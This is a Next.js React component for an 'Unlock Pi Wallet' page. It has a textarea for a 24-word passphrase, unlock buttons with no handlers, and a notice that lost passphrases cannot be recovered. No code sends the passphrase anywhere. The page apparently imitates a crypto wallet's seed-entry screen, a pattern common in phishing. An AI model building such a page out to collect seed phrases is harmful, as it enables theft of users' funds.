"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function UnlockPiWallet() {
  const router = useRouter();
  const [passphrase, setPassphrase] = useState("");

  return (
    <div className="flex flex-col items-center justify-between min-h-screen bg-white px-4 py-10 text-center">
      <h2 className="text-2xl font-semibold mb-4">Unlock Pi Wallet</h2>
      
      {/* Passphrase Input */}
      <textarea
        className="w-full md:w-2/3 lg:w-1/2 h-32 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-purple-500 text-gray-700"
        placeholder="Enter your 24-word passphrase here"
        value={passphrase}
        onChange={(e) => setPassphrase(e.target.value)}
      />
      
      {/* Buttons */}
      <div className="w-full md:w-2/3 lg:w-1/2 mt-4">
        <button
          className="w-full border-2 border-purple-500 text-purple-500 py-3 rounded-lg text-lg font-medium hover:bg-purple-500 hover:text-white transition"
        >
          Unlock With Passphrase
        </button>
        
        <button
          className="w-full mt-4 bg-purple-700 text-white py-3 rounded-lg text-lg font-medium hover:bg-purple-800 transition"
        >
          Unlock With Face ID
        </button>
      </div>
      
      {/* Warning Text */}
      <p className="mt-6 text-sm text-gray-600 max-w-md">
        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
      </p>
      <p className="text-sm text-gray-600">
        Lost your passphrase? <a href="#" className="text-blue-500 hover:underline">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
      </p>
    </div>
  );
}
